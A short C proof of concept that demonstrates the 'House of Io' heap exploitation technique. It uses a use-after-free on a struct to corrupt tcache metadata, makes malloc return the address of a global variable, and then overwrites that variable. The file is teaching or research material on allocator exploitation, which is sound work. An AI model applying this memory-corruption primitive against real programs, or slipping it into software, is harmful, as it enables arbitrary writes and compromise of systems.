/* STRUCT UAF variant of House of Io */

#include <stdio.h>
#include <stdlib.h>

unsigned long victim = 1;

typedef struct hi {
        char *a;
        char *b;
};

int main()
{
        long int *a, *b, *z;
        struct hi *ptr = malloc(sizeof(ptr));

        ptr->a = malloc(10);
        ptr->b = malloc(10);
        free(ptr);
        
        //This is a UAF on a struct entry
        a = ptr->b;        
        //set the tcache count to n > 1
        *a = 2;
        
        //get a pointer to target tc_idx
        //this is deterministic because tcache 
        //metadata chunk is an instance of its type. 
        z = (char *)a + 0x80;

        //set the list head to victim 
        //we could also spray this address here so as to increase
        //the likelihood of getting the address returned by malloc
        *z = &victim; 

        //get the victim address 
        b = malloc(0x15);

        //set value at victim 
        *b = 2; 
        
        printf("%d\n", victim);

        return 0;
}

